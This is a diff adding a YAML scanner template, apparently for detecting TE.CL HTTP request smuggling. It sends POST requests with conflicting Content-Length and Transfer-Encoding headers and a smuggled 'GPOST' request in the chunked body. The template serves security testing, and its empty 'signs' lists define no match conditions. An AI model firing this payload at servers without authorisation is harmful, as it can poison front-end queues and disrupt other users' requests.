@@ -1,0 +1,42 @@
+id: te-cl-http-smuggling
+brief:
+    title: Basic TE.CL - HTTP Request Smuggling
+    by: pdteam
+    level: low
+    about: Detected a potential TE.CL request smuggling condition where an injected Transfer-Encoding header conflicted with an existing Content-Length header, causing differing parsing behavior between proxy...
+    label:
+        - te-cl
+        - smuggling
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/'
+      head:
+        Content-Type: application/x-www-form-urlencoded
+        Content-length: "4"
+        Transfer-Encoding: chunked
+      body: |-
+        5c
+        GPOST / HTTP/1.1
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 15
+
+        x=1
+        0
+      signs: []
+    - verb: POST
+      to:
+        - '{{BaseURL}}/'
+      head:
+        Content-Type: application/x-www-form-urlencoded
+        Content-length: "4"
+        Transfer-Encoding: chunked
+      body: |-
+        5c
+        GPOST / HTTP/1.1
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 15
+
+        x=1
+        0
+      signs: []
